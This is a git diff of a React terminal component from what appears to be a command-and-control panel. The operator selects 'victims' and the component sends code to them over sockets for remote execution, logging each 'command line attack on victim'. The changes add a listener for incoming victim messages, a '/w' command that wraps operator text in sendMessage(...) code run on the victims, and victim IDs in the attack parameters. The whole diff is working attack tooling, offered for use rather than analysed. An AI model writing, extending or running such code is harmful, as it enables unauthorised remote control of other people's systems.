@@ -16,6 +16,10 @@ class Terminal extends Component {
       let d = new Date()
       $.terminal.active().echo(`[${d.toLocaleTimeString()}]: ${text}`)
     })
+    this.props.socket.on('message', function(message){
+      let d = new Date()
+      $.terminal.active().echo(`[${d.toLocaleTimeString()}]: ${message}`)
+    })
   }
 
   _commandHandler(command, term) {
@@ -24,6 +28,11 @@ class Terminal extends Component {
       if(activeTargetSocketIds.length === 0){
         term.echo('Select a target first')
       }
+
+      if(command.startsWith('/w')){
+        command = `sendMessage("${command.slice(2)}")`
+      }
+
       activeTargetSocketIds.forEach((socketId)=>{
         this.props.logger(`Executing command line attack on victim ${this.props.victimsBySocketIdMap[socketId].id}...`)
         let attackInstanceId = `${socketId}_${new Date().valueOf()}`
@@ -47,7 +56,7 @@ class Terminal extends Component {
               });
             }
           }`,
-          params: {id: attackInstanceId}
+          params: {victim: this.props.victimsBySocketIdMap[socketId].id, id: attackInstanceId}
         })
       })
     }
@@ -66,6 +75,7 @@ Terminal.propTypes = {
   actions: PropTypes.object,
   activeTargets: PropTypes.object,
   followupBuffer: PropTypes.object.isRequired,
+  socket: PropTypes.object.isRequired,
   victimsBySocketIdMap: PropTypes.object
 }
 
